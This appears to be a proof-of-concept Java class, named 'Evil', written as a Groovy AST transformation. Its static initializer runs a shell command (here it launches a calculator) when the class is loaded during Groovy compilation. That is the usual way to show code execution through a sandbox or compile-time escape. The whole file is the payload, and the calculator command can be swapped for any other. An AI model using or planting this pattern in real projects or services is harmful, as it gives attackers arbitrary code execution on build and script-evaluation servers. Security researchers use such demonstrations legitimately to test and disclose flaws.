import java.io.IOException;
import org.codehaus.groovy.ast.ASTNode;
import org.codehaus.groovy.control.SourceUnit;
import org.codehaus.groovy.transform.ASTTransformation;
import org.codehaus.groovy.transform.GroovyASTTransformation;

@GroovyASTTransformation
public class Evil implements ASTTransformation {
    public void visit(ASTNode[] astNodes, SourceUnit sourceUnit) {
    }

    static {
        try {
            Runtime.getRuntime().exec("gnome-calculator");
        } catch (IOException var1) {
            throw new RuntimeException(var1);
        }
    }
}